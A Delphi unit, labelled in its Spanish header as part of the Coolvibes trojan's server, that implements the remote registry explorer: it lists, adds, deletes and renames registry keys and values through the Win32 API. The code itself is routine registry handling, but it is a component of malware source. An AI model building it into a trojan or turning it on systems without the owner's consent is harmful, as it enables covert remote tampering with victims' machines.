{Unit perteneciente al server del troyano Coolvibes que contiene todas las funciones
que son usadas en el explorador de registro}
unit UnitRegistro;

interface

uses
  Windows,
  SysUtils,
  UnitFunciones;

function ListarClaves(Clave: string): string;
function ListarValores(Clave: string): string;
function ToKey(Clave: string): hKey;
function BorraClave(Clave: string): boolean;
function AniadirClave(Clave, Val, Tipo: string): boolean;
function RenombrarClave(Ruta, ViejaClave, NuevaClave: PChar): boolean;

implementation

function ListarClaves(Clave: string): string;
var
  phkResult: HKEY;
  lpName:    PChar;
  lpcbName, dwIndex: cardinal;
  lpftLastWriteTime: FileTime;
begin
  //Clave vale algo así: HKEY_LOCAL_MACHINE\SOFTWARE\
  RegOpenKeyEx(ToKey(Copy(Clave, 1, Pos('\', Clave) - 1)), //ToKey(HKEY_LOCAL_MACHINE)
    PChar(Copy(Clave, Pos('\', Clave) + 1, Length(Clave))), //SOFTWARE\
    0,
    KEY_ENUMERATE_SUB_KEYS,  //Los permisos justos y necesarios
    phkResult);
  lpcbName := 255; //Size limit of Key name 255 characters
  GetMem(lpName, lpcbName);
  dwIndex := 0;
  while RegEnumKeyEx(phkResult, dwIndex, @lpName[0], lpcbName, nil,
      nil, nil, @lpftLastWriteTime) = ERROR_SUCCESS do
  begin
    //DateTimeToStr(FileTime2DateTime(lpftLastWriteTime));  //Nos da la fecha de última modificación de la clave, algo muy útil pero no sé donde mostrarlo
    Result := Result + Trim(lpName) + '|';
    Inc(dwIndex);
    lpcbName := 255;
  end;
  RegCloseKey(phkResult);
end;

function ListarValores(Clave: string): string;
var
  phkResult:   HKEY;
  dwIndex, lpcbValueName, lpcbData: cardinal;
  lpData:      PChar;
  lpType:      DWORD;
  lpValueName: PChar;
  strTipo, strDatos, Nombre: string;
  j, Resultado: integer;
  DValue:      PDWORD;
begin
  RegOpenKeyEx(ToKey(Copy(Clave, 1, Pos('\', Clave) - 1)),
    PChar(Copy(Clave, Pos('\', Clave) + 1, Length(Clave))),
    0, KEY_QUERY_VALUE, phkResult);
  dwIndex := 0;
  GetMem(lpValueName, 16383); //Longitud máxima del nombre de un valor: 16383
  Resultado := ERROR_SUCCESS;
  while (Resultado = ERROR_SUCCESS) do
  begin
    //Se guarda en lpcbData el tamaño del valor que vamor a leer
    RegEnumValue(phkResult, dwIndex, lpValueName, lpcbValueName, nil,
      @lpType, nil, @lpcbData);
    //Reservamos memoria
    GetMem(lpData, lpcbData);
    lpcbValueName := 16383;
    //Y ahora lo leemos
    Resultado     := RegEnumValue(phkResult, dwIndex, lpValueName,
      lpcbValueName, nil, @lpType, PByte(lpData), @lpcbData);
    if Resultado = ERROR_SUCCESS then
    begin
      strDatos := '';
      if lpType = REG_DWORD then
      begin
        DValue   := PDWORD(lpData);
        strDatos := '0x' + IntToHex(DValue^, 8) + ' (' + IntToStr(DValue^) + ')';
        //0xHexValue (IntValue)
      end
      else
      if lpType = REG_BINARY then
      begin
        if lpcbData = 0 then
          strDatos := '(No hay datos)'
        else
          for j := 0 to lpcbData - 1 do
            strDatos := strDatos + IntToHex(Ord(lpData[j]), 2) + ' ';  //4D 5A 00 10
      end
      else
      if lpType = REG_MULTI_SZ then
      begin
        for j := 0 to lpcbData - 1 do
          if lpData[j] = #0 then  //Fin de una cadena múltiple
            lpData[j] := ' ';
        strDatos := lpData;
      end
      else  //En caso de no ser DWORD, BINARY o MULTI_SZ copiar tal cual
        strDatos := lpData;
      if lpValueName[0] = #0 then //Primer caracter = fin de linea, cadena vacía
        Nombre := '(Predeterminado)'
      else
        Nombre := lpValueName;
      case lpType of
        REG_BINARY: strTipo := 'REG_BINARY';
        REG_DWORD: strTipo := 'REG_DWORD';
        REG_DWORD_BIG_ENDIAN: strTipo := 'REG_DWORD_BIG_ENDIAN';
        REG_EXPAND_SZ: strTipo := 'REG_EXPAND_SZ';
        REG_LINK: strTipo := 'REG_LINK';
        REG_MULTI_SZ: strTipo := 'REG_MULTI_SZ';
        REG_NONE: strTipo := 'REG_NONE';
        REG_SZ: strTipo := 'REG_SZ';
      end;
      Result := Result + Nombre + '|' + strTipo + '|' + strDatos + '|';
      Inc(dwIndex);
    end;
  end;
  RegCloseKey(phkResult);
end;

//Función para pasar de cadena a valor HKEY
function ToKey(Clave: string): HKEY;
begin
  if Clave = 'HKEY_CLASSES_ROOT' then
    Result := HKEY_CLASSES_ROOT
  else if Clave = 'HKEY_CURRENT_CONFIG' then
    Result := HKEY_CURRENT_CONFIG
  else if Clave = 'HKEY_CURRENT_USER' then
    Result := HKEY_CURRENT_USER
  else if Clave = 'HKEY_LOCAL_MACHINE' then
    Result := HKEY_LOCAL_MACHINE
  else if Clave = 'HKEY_USERS' then
    Result := HKEY_USERS
  else
    Result := 0;
end;

 //Función que borra una clave (HKEY_LOCAL_MACHINE\SOFTWARE\ZETA\) o un valor
 //(HKEY_LOCAL_MACHINE\SOFTWARE\ZETA\value)
function BorraClave(Clave: string): boolean;
var
  phkResult: HKEY;
  Valor:     string;
  ClaveTemp, ClaveBase, SubClaves: string;
begin
  ClaveTemp := Clave;
  //ClaveTemp:= HKEY_LOCAL_MACHINE\SOFTWARE\ZETA\
  ClaveBase := Copy(ClaveTemp, 1, Pos('\', ClaveTemp) - 1);
  //ClaveBase := HKEY_LOCAL_MACHINE
  Delete(ClaveTemp, 1, Pos('\', ClaveTemp));              //ClaveTemp := SOFTWARE\ZETA\
  if ClaveTemp[Length(ClaveTemp)] = '\' then //Borrando CLAVE
  begin
    ClaveTemp := Copy(ClaveTemp, 1, Length(ClaveTemp) - 1);  //Clave := SOFTWARE\ZETA
    Valor     := Copy(ClaveTemp, LastDelimiter('\', ClaveTemp) + 1, Length(ClaveTemp));
    //Valor := ZETA
    Delete(ClaveTemp, LastDelimiter('\', ClaveTemp), Length(ClaveTemp));
    //Clave := SOFTWARE
    RegOpenKeyEx(ToKey(ClaveBase), PChar(ClaveTemp), 0, KEY_WRITE, phkResult);
    if ListarClaves(Clave) = '' then  //No hay subclaves
      Result := (RegDeleteKey(phkResult, PChar(Valor)) = ERROR_SUCCESS)
    else  //Hay subclaves, tenemos que borrarlas antes de borrar la clave
    begin
      SubClaves := ListarClaves(Clave);
      while Pos('|', SubClaves) > 0 do
      begin
        Result := BorraClave(Clave + Copy(SubClaves, 1, Pos('|', SubClaves) - 1) + '\');
        if Result = False then
          break;  //No seguimos borrando
        Delete(SubClaves, 1, Pos('|', SubClaves));
      end;
      //Una vez borradas las subclaves ahora podemos borrar la clave
      Result := (RegDeleteKey(phkResult, PChar(Valor)) = ERROR_SUCCESS);
    end;
  end
  else //Borrando VALOR por ejemplo: ////ClaveTemp:= SOFTWARE\ZETA\Value
  begin
    Valor := Copy(ClaveTemp, LastDelimiter('\', ClaveTemp) + 1, Length(ClaveTemp));
    //Valor := Value
    Delete(ClaveTemp, LastDelimiter('\', ClaveTemp), Length(ClaveTemp));
    //ClaveTemp:= SOFTWARE\ZETA
    RegOpenKeyEx(ToKey(ClaveBase), PChar(ClaveTemp), 0, KEY_SET_VALUE, phkResult);
    Result := (RegDeleteValue(phkResult, PChar(Valor)) = ERROR_SUCCESS);
  end;
  RegCloseKey(phkResult);
end;

//Función para añadir una clave o un valor de cualquier tipo
function AniadirClave(Clave, Val, Tipo: string): boolean;
var
  phkResult: HKEY;
  Valor: string;
  ClaveBase: string;
  Cadena: string;
  binary: array of byte;
  i: integer;
begin
  ClaveBase := Copy(Clave, 1, Pos('\', Clave) - 1);
  //Se queda por ejemplo con HKEY_LOCAL_MACHINE
  Delete(Clave, 1, Pos('\', Clave));
  //Borramos de clave lo que acabamos de copiar a ClaveBase
  Valor := Copy(Clave, LastDelimiter('\', Clave) + 1, Length(Clave));  //Leemos el valor
  Delete(Clave, LastDelimiter('\', Clave), Length(Clave));  //Borramos de clave el valor
  if Tipo = 'clave' then
  begin
    RegOpenKeyEx(ToKey(ClaveBase), PChar(Clave), 0, KEY_CREATE_SUB_KEY, phkResult);
    Result := (RegCreateKey(phkResult, PChar(Valor), phkResult) = ERROR_SUCCESS);
    RegCloseKey(phkResult);
    Exit;
  end;
  if RegOpenKeyEx(ToKey(ClaveBase), PChar(Clave), 0, KEY_SET_VALUE, phkResult) =
    ERROR_SUCCESS then
  begin
    if Tipo = 'REG_SZ' then
      Result := (RegSetValueEx(phkResult, PChar(Valor), 0, REG_SZ,
        PChar(Val), Length(Val)) = ERROR_SUCCESS);
    if Tipo = 'REG_BINARY' then
    begin
      if Val[Length(Val)] <> ' ' then  //Forzamos a que el último caracter sea un espacio
        Val := Val + ' ';
      Cadena := Val;
      i := 0;
      SetLength(binary, Length(Cadena) div 3);
      while Cadena <> '' do  //Recorremos la cadena rellenando el array de bytes
      begin
        binary[i] := HexToInt(Copy(Cadena, 0, Pos(' ', Cadena) - 1));
        Delete(Cadena, 1, Pos(' ', Cadena) + 1);
        Inc(i);
      end;
      Result := (RegSetValueEx(phkResult, PChar(Valor), 0, REG_BINARY,
        @binary[0], Length(binary)) = ERROR_SUCCESS);
    end;
    if Tipo = 'REG_DWORD' then
    begin
      i      := StrToInt(Val);
      Result := (RegSetValueEx(phkResult, PChar(Valor), 0, REG_DWORD, @i, sizeof(i)) =
        ERROR_SUCCESS);
    end;
    if Tipo = 'REG_MULTI_SZ' then
    begin
      while Pos(#13#10, Val) > 0 do
        //Sustituye los saltos de linea #13#10 por caracteres de fin de linea #0
        Val := Copy(Val, 1, Pos(#13#10, Val) - 1) + #0 +
          Copy(Val, Pos(#13#10, Val) + 2, Length(Val));
      Val := Val + #0#0;
      //El doble caracter de fin de linea indica el final de una clave MULTI_SZ
      Result := (RegSetValueEx(phkResult, PChar(Valor), 0, REG_MULTI_SZ,
        PChar(Val), Length(Val)) = ERROR_SUCCESS);
    end;
    RegCloseKey(phkResult);
  end
  else
    Result := False;
end;

function RenombrarClave(Ruta, ViejaClave, NuevaClave: PChar): boolean;
var
  NewKey:    HKEY;
  ClaveBase: string;
  tipo, lenDatos: DWORD;
  Datos:     Pointer;
begin
  Result    := False;
  ClaveBase := Copy(Ruta, 1, Pos('\', Ruta) - 1);
  if RegOpenKeyEx(ToKey(ClaveBase), PChar(Copy(Ruta, Pos('\', Ruta) + 1, Length(Ruta))),
    0, KEY_READ or KEY_SET_VALUE, NewKey) = ERROR_SUCCESS then
  begin
    if RegQueryValueEx(NewKey, ViejaClave, nil, @tipo, nil, @lenDatos) =
      ERROR_SUCCESS then
    begin
      GetMem(Datos, lenDatos);
      if RegQueryValueEx(NewKey, ViejaClave, nil, @tipo, Datos, @lenDatos) =
        ERROR_SUCCESS then
        //Creamos la clave con el nuevo nombre
        if RegSetValueEx(NewKey, NuevaClave, 0, tipo, Datos, lenDatos) =
          ERROR_SUCCESS then
          //Borramos la anterior clave
          Result := RegDeleteValue(NewKey, ViejaClave) = ERROR_SUCCESS;
      FreeMem(Datos, lenDatos);
    end;
  end;
  RegCloseKey(NewKey);
end;

end.
